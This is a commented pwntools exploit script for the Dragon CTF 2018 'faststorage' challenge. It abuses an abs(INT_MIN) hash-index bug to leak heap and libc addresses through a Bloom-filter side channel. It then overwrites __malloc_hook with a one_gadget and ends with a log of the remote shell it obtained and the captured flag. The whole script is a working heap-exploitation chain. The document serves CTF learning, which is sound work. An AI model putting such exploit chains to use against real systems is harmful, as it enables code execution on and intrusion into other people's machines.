#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import os

from pwn import *

context(arch="amd64", os="linux")

if not args["REMOTE"]:
    binary = ELF("./faststorage-2.23-0ubuntu10")
    libc = ELF("./libc-amd64-2.23-0ubuntu10.so")

    argv = [binary.path]
    envp = {"PWD": os.getcwd()}

    if args["GDB"]:
        io = gdb.debug(
            args=argv,
            env=envp,
            aslr=False,
            terminal=["tmux", "new-window"],
            gdbscript="""\
                set $bitmaps=0x555555756040
                set $entries=0x555555756140

                continue
            """,
        )
    else:
        io = process(argv=argv, env=envp)
else:
    binary = ELF("./faststorage")
    libc = ELF("./libc-amd64-2.23-0ubuntu10.so")

    io = remote("faststorage.hackable.software", 1337)

# by integeruser

# thanks to https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-09-29-Teaser-Dragon-CTF/README.md#400-pwning--fast-storage
# for showing me how to leak an address from libc by shrinking the top chunk


# `faststorage` implements a Bloom filter, a probabilistic data structure used to test if
# an element is a member of a set; false positive matches are possible but false negatives are not

# this data structure is implemented using: 1) a hash table (here called `entries`) whose elements
# are linked lists containing all entries for which the hash function generates the same index;
# and 2) a hash table (here called `bitmaps`) whose elements are bit arrays (dwords) used
# to quickly check if an entry is contained in the first hash table

# the index to use for storing an entry is calculated as: `index = abs(hash(entry->name)) % 62`
# the flaw here is that `abs(INT_MIN)` is not defined, and its result is `INT_MIN`; thus, if we can
# find a name such that `hash(entry->name) == INT_MIN`, then the entry will be stored outside
# the hash table at index -2 (i.e. `INT_MIN % -62`)


def add_entry(name, value):
    io.sendlineafter("> ", "1")
    io.sendafter("Name: ", fit({0: name}, filler="\0", length=256))
    io.sendlineafter("Size: ", str(len(value)))
    io.sendafter("Value: ", value)


def print_entry(name):
    io.sendlineafter("> ", "2")
    io.sendafter("Name: ", fit({0: name}, filler="\0", length=256))
    return io.recvline()


def edit_entry(name, value):
    io.sendlineafter("> ", "3")
    io.sendafter("Name: ", fit({0: name}, filler="\0", length=256))
    io.sendafter("Value: ", value)


# start by adding some entries with very specific names (the why is explained later)
names_for_bit_at_index_60 = {
    12: b"K\x131\tz{\xf2(B\x01-\x7f",
    13: b".\xd6;wI\xe6\xe1\x10\xc0\xe4\x06\xa5",
    14: b"^\xe0\xc0\xd0 \xc8\xd4\xca\xbf\x0e\xfc\xc7",
    15: b"\x8dg\xcd_\xa0T\xe4P\xa7\x10\xd2\xf9",
    16: b"r\xfd\xdb\xd4\xe0\xe5\xe8\xc9\xa0a\x03\x8d",
    17: b"\xbeO\xf2\xdf\xa48\xf32\xe04\xc8\x03",
    18: b"\x16\xfd\xbe\xb4\x18y\x07\x1c\xfc\xd0,\xc7",
    19: b"\xf6\xec\xf6\xe0\xa8\x80\xc4\xd0\xe9\xba\xce\xed",
    20: b"\xf9\xf6\xdf\x7f-\x18\xf1\x98X\xa0z\x81",
    21: b"\x01\x08\xc0\x01G\x08\x10\xc0\xa0\x01\x08\x8b",
    22: b"~\xee\x97\xf3\xa6z`\xe1\xbb\xa0*\xf1",
    23: b"\x10\x80\x01\x87\t\x9a\x10\x80\x90\x81\x14\x03",
    24: b"\x0c\x08\xc5\x10\x08( \x89CDB\x81",
    25: b'A\x16\xa3"\x04\x84\x80\x01\x16\x84\x06\x05',
    26: b"\x88$\x98\xb0\xc1\nI\x02\x01\x82\x08\x83",
    27: b"@\x04\x030\x05\x80\x18\xaca\xa0\xaa1",
    28: b"\x02\x84\x90\x10\x98\x05\x90\x84\x14\xe0\xc6-",
    29: b'\x8f \x02\x84\x81\xa4\x08"\xe2\x88\x1aQ',
    30: b"\xa4\x12\xac0\x03\x80\xca\x02\r\x84`\x1b",
    31: b"@$ (\xa9(\x80(\xd4,\xb4\x1f",
}
names_for_bit_at_index_61 = {
    0: b"\xb0\x9a\xb6\xca \xd1 \x01I\xa0B\x14",
    1: b"\x0b\x820L\x10 3\xa6\x81\xe0;\x91",
    2: b"\x01H\x01$A\xa0G\xc4\xf4\xf8\x90|",
    3: b"\xfe\xdf\xae\x92\x02\x01\x02\x02\x04\x80\xbb\x01",
    4: b"'\x82'\x02\xe2\x83BW\xa4\xa0\x8d\x12",
    5: b"\x9e\x9a\x1f\xa0\x10\xc1\x90\x80\x06\x0e\x8f\xb2",
    6: b'a\x02a\x9cw"1\xc4\x90\xd1\xb2\x8c',
    7: b"\xd1XAT\xd9 \x80(}<\x91v",
    8: b"\xe2\x95\xd7\xfa\xc0\xaex\t\x08\x02Q\x03",
    9: b"\x19\xec\xf2\xc4b\xa6\x027\xbc\x08\x88\\",
    10: b"\xbf`\xeaf\x9c\xd8\x08i\x80\x88S\x1d",
    11: b"\xf66\xdbb\xb1\x80\x10)\xb3\x88Y.",
    12: b"<`Qv\x03\xa5\xef\x9a\x89\xa00\xfc",
    13: b"\xeeP\x8c\x84\xa8\xf9\x98y\x92\xc0\xf3\x8b",
    14: b"P\x98&\xd7\x11\x13\x06\xfd\xa0\x88\xeb\xff",
    15: b"\xe0\x17\xd4\x98\x9f$\x9a\xe81\xb8\xf1>",
}
for name in names_for_bit_at_index_60.values():
    add_entry(name, "CCCCDDDD")
for name in names_for_bit_at_index_61.values():
    add_entry(name, "CCCCDDDD")

# NB all entry names used in this exploit were computed using the accompaining script `find_name_for_bits.py`

# 1) as discussed above, let's add an entry with a name such that its hash (`h1`) leads to a table index of -2,
# thus storing the pointer of this entry at `entries[-2]`
a_name_to_have_index_minus_two = b'\xb5\xcc\x8c\x05\x04S\x10P$\xca"\t'
add_entry(a_name_to_have_index_minus_two, "AAAABBBB")
# now, the address of the entry is stored at `entries[-2]`, which incidentally coincides with the last part
# of the `bitmaps` table (i.e. the lower half of the address is stored at `bitmaps[60]` and
# the upper half at `bitmaps[61]`)

# these bitmaps are used to decide if an entry is stored or not in `entries`, by computing
# two more hashes (`h2` and `h3`) from the name of the entry to look for
# these hashes are then used as masks for checking if certain bits in the bitmap are set;
# if they are, the entry is believed to be stored in `entries` (could be a false positive)
# by using proper names which lead to particular hashes, we can use this process of searching for entries as
# a side channel, leaking all bits of any dword stored in `bitmaps`

# given that, by writing at `entries[-2]`, we wrote in `bitmaps[60]` and `bitmaps[61]` an address from the heap,
# we can leak it bit by bit; we just need to find names for entries for which: 1) the computed index is 60 (or 61)
# and 2) `h2` == `h3` == index of the bit we want to leak
# in this exploit, these names are stored in `names_for_bit_at_index_60` and `names_for_bit_at_index_61`

a_heap_addr = 0
# we already know the lowest 12 bits (1st to 12th) from GDB (ASLR does not affect them)
a_heap_addr |= 0x555555757DD0 & 0b111111111111
# leak bits 13th to 32th at `bitmaps[60]`
for (
    bit_to_leak,
    a_name_to_leak_the_ith_bit_at_index_60,
) in names_for_bit_at_index_60.items():
    # we try to print the content of the entry with the crafted name for leaking the i-th bit:
    # if "no such entry!", the bit is 0; otherwise, the bit is one
    value = print_entry(a_name_to_leak_the_ith_bit_at_index_60)
    if not "No such entry!" in value:
        a_heap_addr |= 1 << bit_to_leak
    # if the bit is one, the program continues its execution believing that an entry with the specified name
    # is indeed stored in `entries`, and walks through the linked list searching for it: this is why
    # we had to stored all those entries at the start of the script

# leak bits 33th to 48th at `bitmaps[61]` (bits from 49th to 64th are always zero)
for (
    bit_to_leak,
    a_name_to_leak_the_ith_bit_at_index_61,
) in names_for_bit_at_index_61.items():
    value = print_entry(a_name_to_leak_the_ith_bit_at_index_61)
    if not "No such entry!" in value:
        a_heap_addr |= 1 << (32 + bit_to_leak)
# ...and find the base address of the heap
heap_addr = a_heap_addr - (0x555555757DD0 - 0x555555757000)
io.success("heap_addr: %#x" % heap_addr)

# now that we now know where chunks are and will be malloc'ed, we can calculate the address of (needed later):
a_name_to_have_index_minus_two_addr = heap_addr + (0x555555757DB0 - 0x555555757000)
top_chunk_addr = heap_addr + (0x555555757EB0 - 0x555555757000)
top_chunk_size_addr = top_chunk_addr - 0x8


# 2nd part of the exploit: leaking an address from libc

# the following steps explain how to get a (kind of) arbitrary write, used to leak an address from libc

# 1) add an entry with a name such that the computed index for this entry is -2,
# thus storing a pointer to this entry at `entries[-2]` (as before)

# 2) since we know where it will be stored in the heap (we know the base address),
# we can create an entry whose value is a specially crafted fake entry (used later), for which
# we control the pointer to the memory area supposedly containing the value of the entry
fake_entry_size = 0x8  # the size of the memory area containing the value of the entry
fake_entry_value_ptr = (
    top_chunk_size_addr
)  # the pointer to the memory area containing the value of the entry
fake_entry = fit(
    {
        0x00: p64(0x0),  # the pointer to the next entry in the linked list (don't care)
        0x08: p64(
            a_name_to_have_index_minus_two_addr
        ),  # the pointer to the name of the entry
        0x10: p64(fake_entry_size << 48 | fake_entry_value_ptr),
    }
)
add_entry("ABCD", fake_entry)
# the created fake entry is stored at:
fake_entry_addr = heap_addr + (0x555555757DF0 - 0x555555757000)

# now, at `entries[-2]` is stored the address of a previously added entry; this address differs from the
# address of the fake entry for a single bit (the 6th)

# 3) we can add a new entry at index 60 with a suitable name so to also set the 6th bit at `bitmaps[60]`
# (that is `entries[-2]`)
a_name_to_set_the_6th_bit_at_index_60 = b"\x80Fl\x97\x9c\xd89\x80(Xr\t"
add_entry(a_name_to_set_the_6th_bit_at_index_60, "WHATEVER")

# 4) since we just set the 6th bit, `entries[-2]` now contains exactly the address of our fake entry;
# editing it will overwrite the top chunk size!
top_chunk_new_size = (
    0x161
)  # keep only the last bits (intact so to not disrupt anything)
edit_entry(a_name_to_have_index_minus_two, p64(top_chunk_new_size))
# the top chunk is now a only a few bytes big

# the next allocation will cause the heap to grow in size
add_entry("consume\x00", fit(length=0x400))
# as a side effect, there is now a chunk of size 0x100 in the unsorted bin, containing
# two double links to libc (as `fd` and `bk`)

# now, we add an entry of suitable size such that `malloc()` returns the chunk in the unsorted bin
# for storing the value of the entry
io.sendlineafter("> ", "1")
io.sendafter("Name: ", "LEAK")
io.sendlineafter("Size: ", str(0x80))
# send only 8 bytes for the value so to not overwrite the `bk` of the chunk (that we want to leak)
io.sendafter("Value: ", "AAAABBBB")

# print the value of the entry just added to leak `bk`
value = print_entry("LEAK")
a_libc_address = u64(value[7 + 8 : 7 + 8 + 6].ljust(8, "\0"))
# compute the base address of libc
libc.address = a_libc_address - (0x7FFFF7DD1B78 - 0x00007FFFF7A0D000)
io.success("libc.address: %#x" % libc.address)


# 3rd part of the exploit: setting `__mallok_hook`

# the unsorted bin still contains a chunk; allocate it so to have (for simplicity) all heap bins empty
add_entry("ABCD", fit(length=0x28))

# now, repeat the procedure used above for the (kind of) arbitrary write

# 1) add an entry with a name such that the computed index for this entry is -2,
# thus storing a pointer to this entry at `entries[-2]`
add_entry(a_name_to_have_index_minus_two, "AAAABBBB")

# 2) add a new entry containing as value a whole fake entry
fake_entry_size = 0x8
fake_entry_value_ptr = libc.symbols["__malloc_hook"]
fake_entry = fit(
    {
        0x00: p64(0x0),  # the pointer to the next entry in the linked list (don't care)
        0x08: p64(
            a_name_to_have_index_minus_two_addr
        ),  # the pointer to the name of the entry
        0x10: p64(fake_entry_size << 48 | fake_entry_value_ptr),
    }
)
add_entry("ABCD", fit({0x20: fake_entry}))
# here we shifted the position of the fake entry by 0x20 bytes so that the address
# of the fake entry will differ from the address stored at `entries[-2]` by a single bit (the 7th)

# 3) add a new entry at index 60 with a suitable name so to set the 7th bit at `bitmaps[60]`
# (that is `entries[-2]`)
a_name_to_set_the_7th_bit_at_index_60 = b"\x1b\x06\x8fM\x10\x0f\xc1\x8d\x12\x80\x1c7"
add_entry(a_name_to_set_the_7th_bit_at_index_60, "WHATEVER")
# now, the address at `entries[-2]` is exactly a pointer to our fake entry

# $ one_gadget ./libc-amd64-2.23-0ubuntu10.so
# . . .
# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL
# . . .
one_gadget_addr = libc.address + 0x4526A
# 4) edit the value of the entry at index -2 to write the address of the one-gadget into `__malloc_hook`
edit_entry(a_name_to_have_index_minus_two, p64(one_gadget_addr))

# finally, add any entry to trigger the execution of `malloc()` (thus executing the one-gadget)
io.sendlineafter("> ", "1")
io.sendafter("Name: ", "WHATEVER")
io.sendlineafter("Size: ", str(0x123))
# and enjoy the shell
io.interactive()
# $ ./faststorage.py REMOTE
# [*] '/home/vagrant/vbox/Fast-Storage/faststorage'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] '/home/vagrant/vbox/Fast-Storage/libc-amd64-2.23-0ubuntu10.so'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Opening connection to faststorage.hackable.software on port 1337: Done
# [+] heap_addr: 0x55652a30e000
# [+] libc.address: 0x7fdae5733000
# [*] Switching to interactive mode
# $ ls
# faststorage
# flag.txt
# $ cat flag.txt
# DrgnS{6f617344e5be892284e72c2b76ea004a}
